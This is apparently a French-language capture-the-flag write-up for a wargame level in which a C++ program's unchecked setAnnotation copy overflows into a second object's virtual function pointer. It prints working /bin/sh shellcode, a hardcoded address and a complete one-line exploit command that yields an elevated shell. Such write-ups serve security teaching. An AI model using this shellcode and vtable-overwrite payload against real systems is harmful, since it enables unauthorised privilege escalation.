# Level 9 - Exploitation d'une classe C++ avec fonctions virtuelles

## Objectif
Exploiter un programme C++ qui utilise des classes avec des fonctions virtuelles pour obtenir un shell avec des privilèges élevés.

## Analyse du programme
1. Le programme crée deux objets d'une classe C++.
2. Il utilise une fonction `setAnnotation` pour copier l'input de l'utilisateur dans le premier objet.
3. Il appelle ensuite une fonction virtuelle du second objet.

## Vulnérabilité
La fonction `setAnnotation` copie l'input sans vérifier sa taille, permettant un dépassement de tampon (buffer overflow).

## Stratégie d'exploitation
1. Écraser le pointeur de fonction virtuelle du second objet.
2. Le faire pointer vers notre shellcode.

## Composants de l'exploit
1. **Adresse du shellcode**: `0x804a00c`
   - C'est l'endroit où notre shellcode sera placé en mémoire.

2. **Shellcode**: 
   ```
   \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
   ```
   - Ce code assembleur exécute `/bin/sh` quand il est exécuté.

3. **NOP sled**: 
   - Une série d'instructions "No Operation" pour augmenter la probabilité de tomber sur notre shellcode.

4. **Structure de la payload**:
   - Adresse du shellcode (4 bytes)
   - Shellcode (21 bytes)
   - NOP sled (83 bytes)
   - Adresse du shellcode répétée (4 bytes)

## Commande d'exploitation
```
./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
```

## Explication de la commande
1. `\x0c\xa0\x04\x08`: Adresse du shellcode (en little-endian).
2. `\x6a\x0b...`: Le shellcode lui-même.
3. `"\x90" * 83`: NOP sled pour remplir l'espace.
4. `\x0c\xa0\x04\x08`: Répétition de l'adresse du shellcode pour écraser le pointeur de fonction virtuelle.

## Fonctionnement
1. Le programme copie notre payload dans le premier objet.
2. Quand il essaie d'appeler la fonction virtuelle du second objet, il saute à notre shellcode.
3. Le shellcode s'exécute, nous donnant un shell avec des privilèges élevés.

## Conclusion
Cette exploitation utilise une combinaison de dépassement de tampon et de manipulation de pointeurs de fonctions virtuelles en C++ pour exécuter du code arbitraire et obtenir un accès privilégié au système.